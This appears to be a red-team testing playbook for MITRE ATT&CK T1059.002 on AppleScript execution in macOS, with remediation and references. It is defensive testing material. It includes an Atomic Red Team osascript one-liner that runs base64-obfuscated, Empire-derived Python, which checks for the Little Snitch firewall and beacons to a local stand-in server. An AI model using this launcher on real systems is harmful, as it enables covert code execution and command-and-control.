---
name: "T1059.002_applescript"
description: "Adversaries may abuse AppleScript for execution."
category: "input-validation"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1059.002
  - execution
  - macos
  - sub-technique
technique_id: "T1059.002"
tactic: "execution"
all_tactics:
  - execution
platforms:
  - macOS
mitre_url: "https://attack.mitre.org/techniques/T1059/002"
tech_stack:
  - macos
cwe_ids:
  - CWE-94
chains_with:
  - T1059
  - T1059.001
  - T1059.003
  - T1059.004
  - T1059.005
  - T1059.006
  - T1059.007
  - T1059.008
  - T1059.009
  - T1059.010
  - T1059.011
  - T1059.012
  - T1059.013
prerequisites:
  - T1059
severity_boost:
  T1059: "Chain with T1059 for deeper attack path"
  T1059.001: "Chain with T1059.001 for deeper attack path"
  T1059.003: "Chain with T1059.003 for deeper attack path"
---

# T1059.002 AppleScript

> **Sub-technique of:** T1059

## High-Level Description

Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents. These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.

Scripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e "script here"</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file.

AppleScripts do not need to call <code>osascript</code> to execute. However, they may be executed from within mach-O binaries by using the macOS Native APIs <code>NSAppleScript</code> or <code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility.

Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute Native APIs, which otherwise would require compilation and execution in a mach-O binary file format. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via Python.

## Kill Chain Phase

- Execution (TA0002)

**Platforms:** macOS

## What to Check

- [ ] Identify if AppleScript technique is applicable to target environment
- [ ] Check macOS systems for indicators of AppleScript
- [ ] Verify mitigations are bypassed or absent (2 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: AppleScript

Shell Script with AppleScript. The encoded python script will perform an HTTP GET request to 127.0.0.1:80 with a session cookie of "t3VhVOs/DyCcDTFzIKanRxkvk3I=", unless 'Little Snitch' is installed, in which case it will just exit.
You can use netcat to listen for the connection and verify execution, e.g. use "nc -l 80" in another terminal window before executing this test and watch for the request.

Reference: https://github.com/EmpireProject/Empire

**Supported Platforms:** macos

```bash
osascript -e "do shell script \"echo \\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));\\\" | python &\""
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to AppleScript by examining the target platforms (macOS).

2. **Assess Existing Defenses**: Review whether mitigations for T1059.002 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1045 Code Signing

Require that all AppleScript be signed by a trusted developer ID before being executed - this will prevent random AppleScript code from executing. This subjects AppleScript code to the same scrutiny as other .app files passing through Gatekeeper.

### M1038 Execution Prevention

Use application control where appropriate.

## Detection

### Detection of AppleScript-Based Execution on macOS

## Risk Assessment

| Finding                          | Severity | Impact    |
| -------------------------------- | -------- | --------- |
| AppleScript technique applicable | Low      | Execution |

## CWE Categories

| CWE ID | Title                                  |
| ------ | -------------------------------------- |
| CWE-94 | Improper Control of Generation of Code |

## References

- [Apple AppleScript](https://developer.apple.com/library/archive/documentation/AppleScript/Conceptual/AppleScriptLangGuide/introduction/ASLR_intro.html)
- [SentinelOne macOS Red Team](https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/)
- [SentinelOne AppleScript](https://www.sentinelone.com/blog/how-offensive-actors-use-applescript-for-attacking-macos/)
- [Macro Malware Targets Macs](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/macro-malware-targets-macs/)
- [Atomic Red Team - T1059.002](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1059.002)
- [MITRE ATT&CK - T1059.002](https://attack.mitre.org/techniques/T1059/002)
